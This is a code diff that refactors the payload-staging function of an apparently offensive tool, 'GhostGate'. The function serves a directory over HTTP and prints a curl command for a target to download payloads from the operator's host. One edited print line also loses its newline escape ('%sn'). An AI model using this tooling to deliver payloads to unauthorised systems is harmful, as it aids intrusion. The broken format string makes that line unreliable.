@@ -4,7 +4,6 @@ import (
 	"GhostGate/internal/filesystem"
 	"GhostGate/internal/networking"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
@@ -14,7 +13,7 @@ import (
 )
 
 // Function for staging the payload directory
-func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
+func StagePayloadDirectory(port string, stagingDir string, sourceDir string) {
 	// Function to close and delete the staging dir
 	defer func() {
 		fmt.Printf("\n[*] Cleaning up: Removing staging directory: %s\n", stagingDir)
@@ -23,7 +22,6 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 		}
 	}()
 
-	
 	// Creates the staging diredctory if it doesnt exist
 	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
 		// Stores the errors from creating the directory
@@ -38,7 +36,8 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 	// Checks for if source directory was supplyed
 	if sourceDir != "" {
 		// Stores the files from the dirtecoru
-		files, err := ioutil.ReadDir(sourceDir)
+		// Note: os.ReadDir is used here as it provides the modern, optimized replacement for ioutil.ReadDir
+		files, err := os.ReadDir(sourceDir)
 
 		// Catches the errors
 		if err != nil {
@@ -48,13 +47,18 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 
 		// Loops over the files
 		for _, file := range files {
+			// Skip directories to avoid copying nested folders directly into CopyFile
+			if file.IsDir() {
+				continue
+			}
+
 			// Gets the names of the files
 			name := file.Name()
 
 			// Creates the paths
 			srcPath := filepath.Join(sourceDir, name)
 			dstPath := filepath.Join(stagingDir, name)
-			
+
 			// Copies the files
 			filesystem.CopyFile(srcPath, dstPath)
 		}
@@ -67,10 +71,19 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 	// Creates the file server handler
 	fileServer := http.FileServer(http.Dir(stagingDir))
 
+	// Find a real filename for the preview if possible, otherwise default
+	sampleFile := "file"
+	if sourceDir != "" {
+		if files, _ := os.ReadDir(sourceDir); len(files) > 0 {
+			sampleFile = files[0].Name()
+		}
+	}
+
 	// Outputs information
 	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
 	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
-	fmt.Printf("[*] Target download example: curl http://%s:%s/%s/file\n", networking.GetOutboundIP(), port, stagingDir)
+	// Adjusted path to accurately reflect how http.FileServer exposes the folder root
+	fmt.Printf("[*] Target download example: curl http://%s:%s/%sn", networking.GetOutboundIP(), port, sampleFile)
 
 	// Start the server inside a background goroutine so it doesn't block the signals
 	go func() {
@@ -79,7 +92,7 @@ func StagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
 		if err != nil && err != http.ErrServerClosed {
 			log.Printf("Server failed: %v\n", err)
 			// Trigger stop channel if server crashes on its own
-			stop <- syscall.SIGTERM 
+			stop <- syscall.SIGTERM
 		}
 	}()
 
